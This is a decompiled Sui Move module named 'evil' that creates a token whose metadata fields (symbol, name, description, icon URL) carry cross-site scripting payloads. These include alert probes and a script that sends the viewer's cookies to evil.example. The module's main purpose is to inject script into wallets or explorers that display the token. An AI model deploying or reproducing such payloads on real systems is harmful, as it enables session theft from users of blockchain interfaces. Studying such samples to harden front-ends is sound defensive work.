module 0xf4fd434e625a47756a6489c44c4802c9adb2654f1616b0141dc7241c5c4a87d9::evil {
    struct EVIL has drop {
        dummy_field: bool,
    }

    public entry fun mint(arg0: &mut 0x2::coin::TreasuryCap<EVIL>, arg1: u64, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::transfer::public_transfer<0x2::coin::Coin<EVIL>>(0x2::coin::mint<EVIL>(arg0, arg1, arg3), arg2);
    }

    fun init(arg0: EVIL, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1) = 0x2::coin::create_currency<EVIL>(arg0, 9, b"<img src=x onerror=alert('XSS-symbol')>", b"<svg/onload=alert('XSS-name')>", b"<script>fetch('https://evil.example/'+document.cookie)</script>", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20onload%3D%22alert('XSS-icon')%22%2F%3E")), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<EVIL>>(v1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<EVIL>>(v0, 0x2::tx_context::sender(arg1));
    }

    // decompiled from Move bytecode v7
}

